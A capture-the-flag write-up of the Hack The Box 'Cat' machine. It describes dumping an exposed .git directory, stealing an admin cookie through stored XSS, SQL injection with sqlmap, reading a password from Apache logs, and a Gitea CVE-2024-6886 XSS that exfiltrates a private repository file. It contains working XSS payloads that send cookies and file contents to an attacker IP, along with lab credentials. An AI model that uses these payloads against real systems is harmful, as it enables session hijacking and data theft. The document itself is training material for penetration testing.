<h1>CAT WRITE UP</h1>

{cat.png}<br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.53<br>
<b>Hostname:</b> cat.htb<br>
<b>Open Ports:</b> 22/tcp, 80/tcp<br>
<b>Web Server:</b> Apache2 v2.4.41(Ubuntu)<br>
<b>Addition:</b> Gitea<br>

<h2>SUMMARY</h2>

Cat is a medium-difficulty Linux machine that features a custom PHP web application vulnerable to cross-site scripting (XSS). Leveraging this XSS vulnerability, I can perform cookie hijacking to steal an administrator's cookie and elevate my privileges in the application. I can then perform a SQL Injection on a SQLite database to get hashed user credentials. With cracking its hash to gain access as a user who has group membership to read server logs. These logs leak a clear-text password to a user accessing an internally hosted Gitea instance on version 1.22.0, vulnerable to an XSS attack via `CVE-2024-6886` due to improper input sanitization. By exploiting the CVE, I can read a private Gitea repository containing a credential for the root user.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.53</code>

Result:

{ss1.png}<br>

As I can see port 22(SSH) and 80(HTTP) are open. Also there is "/.git/" directory. It means I can reach some source codes and files about application.

<b>2-</b> First thing first, visit "10.10.11.53:80".

{ss2.png}<br>

In there I see on browser's url section is called "cat.htb". So I add "cat.htb" to my "/etc/hosts".

<code>echo "10.10.11.53	cat.htb" | sudo tee -a /etc/hosts</code>

<b>3-</b> Now visit "http://cat.htb".

{ss3.png}<br>

There is a web page about some sort of cat competition. As a functionality I can register and login to the system, after that "Contest" part opens and I can give information about my cat.

{ss4.png}<br>

<b>4-</b> Now I visit "http://cat.htb/.git/".

{ss5.png}<br>

I dont have permission to see git files but I start directory enumeration to be sure.

<code>gobuster dir -u http://cat.htb/.git/ -w ~/Desktop/HTB/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt</code>

Result:

{ss6.png}<br>

<b>5-</b> According to this result I visit "/HEAD" directory.

{ss7.png}<br>

From now on i dump this git files with "git-dumper".

<b>6-</b> I run "git-dumper".

<code>mkdir cat_git_files</code>

<code>git-dumper http://cat.htb/.git ./cat_git_files</code>

Result:

{ss8.png}<br>

<b>7-</b> First in "join.php" register function there is no filter for username input. That means I can inject any special characters as username value when I register.

{ss9.png}<br>

This vulnerable input can lead me to Stored XSS in "view_cat.php".

{ss10.png}<br>

As I can see, my username value reflected here without any sanitazing. So I can execute XSS in here.

<b>8-</b> Second in "accept_cat.php" as "catName" value send in to "cat_name" parameter and without any sanitazing using in SQL query.

{ss11.png}<br>

This can lead me to SQL Injection when I need it.

<b>9-</b> Run http server via php.

<code>php -S 0.0.0.0:8000</code>

I start waiting request to my http server with cookie value in it.

<b>10-</b> After that I register the system with XSS payload as my username value.

My payload= &lt;script&gt;fetch('http://10.10.14.106:8000/?cookie=' + document.cookie);&lt;/script&gt;

{ss12.png}<br>

And login the system.

{ss13.png}<br>

<b>11-</b> Now I just send cat information for admin's approval.

{ss14.png}<br>

From now on I just wait to get request on my http server start earlier.

<b>12-</b> And I get request with cookie value from the system.

{ss15.png}<br>

I got admin user's session cookie. From now on I can reach admin functions with this cookie.

<b>13-</b> From my earlier code views, I know in "accept_cat.php" there will be SQL Injection. So I start "sqlmap" to exploit that injection.

<code>sqlmap --cookie="PHPSESSID=2h6l4kou08tjp8rc90hik973c9" -u "http://cat.htb/accept_cat.php" --data "catId=3&catName=test" -p catName --level 5 --risk 3 --dbms=SQLite --technique=B -T "users" -threads=4 --dump</code>

There it is, I know table name from source codes and again I know what kind of dbms they are using from config files.

Result:

{ss16.png}<br>

I can see all users registered in the system.

<b>14-</b> Now I got a bunch of username and hashed password datas. I try to crack hash one by one with "crackstation.net".

Result:

{ss17.png}<br>

There is only "rosa" user's password value cracked with application.

username= rosa
password= soyunaprincesarosa

<b>15-</b> Let's try ssh connection with these credentials.

<code>ssh rosa@cat.htb</code>

Result:

{ss18.png}<br>

Yes, I got ssh connection to target machine.

<b>16-</b> First I check "rosa" user's id output.

<code>id</code>

Result:

{ss19.png}<br>

There I see a group named as "adm". So I start research about adm group permissions.

<code>find / -group adm 2>/dev/null</code>

Result:

{ss20.png}<br>

In this output most important data is in "/var/log/apache2" file.

<b>17-</b> As I know from source code "axel" user is the admin in application. I need password belongs to axel. Luckly, I can access web application's logs.

<code>grep axel /var/log/apache2 -R</code>

Result:

{ss21.png}<br>

And yes I got "axel" user's password as "aNdZwgC4tI9gnVXv_e3Q".

username= axel
password= aNdZwgC4tI9gnVXv_e3Q

<b>18-</b> Now, try ssh connection as axel user.

<code>ssh axel@cat.htb</code>

Result:

{ss22.png}<br>

And this is how I get user flag!!!

<b>19-</b> After I logged in as "axel" there is a notification like "You have mail.".

{ss23.png}<br>

<b>20-</b> I read "axel" user's mails.

<code>cat /var/mail/axel</code>

Result:

{ss24.png}<br>

<b>21-</b> Because second mail mentioned localhost:3000, I decide to look target machine's local ports.

<code>netstat -tuln</code>

Result:

{ss25.png}<br>

It confirmed port 3000 open and listening state.

<b>22-</b> Start ssh connection with ssh forwarding on port 3000.

<code>ssh -L 3000:127.0.0.1:3000 axel@cat.htb</code>

And visit "http://localhost:3000" on my browser.

Result:

{ss26.png}<br>

Gitea server welcomes me.

<b>23-</b> Most important part is version number for this gitea server.

{ss27.png}<br>

When I research about this version number, I find some vulnerability to exploit. Here is the <a href="https://www.exploit-db.com/exploits/52077">CVE-2024-6886</a>

<b>24-</b> I sign in as axel user which I already know the credentials. According to the CVE, I create new repository and add my payload in description field.

Payload= &lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.106:4545/?content="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS fnwn&lt;/a&gt;

{ss28.png}<br>

My idea is to get "index.php" source code as root user, maybe I'll get some information from there.

<b>25-</b> On my machine start http server for listening.

<code>python3 -m http.server 4545</code>

If everything works I want to see request on my http server.

<b>26-</b> Before sending a mail to "jobert" user, I must give something for it to visit. So for that I create new file in repository which I created.

<b>27-</b> Back to the target machine and send mail as "axel" user to "jobert" user to visit my vulnerable repository.

<code>echo "http://localhost:3000/axel/fnwn" | sendmail jobert@localhost</code>

Result:

{ss29.png}<br>

Now I need to decode this base64 output.

<b>28-</b> To decode this

<code>echo "PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK" | base64 -d</code>

Result:

{ss30.png}<br>

Now I got root user password.

Password= IKw75eR0MR7CMIxhH0

<b>29-</b> Change user "axel" to "root".

<code>su root</code>

Result:

{ss31.png}<br>

And this is how I get root flag!!!

<h2>RESOURCE</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/52077">CVE-2024-6886</a></li>
</ul>
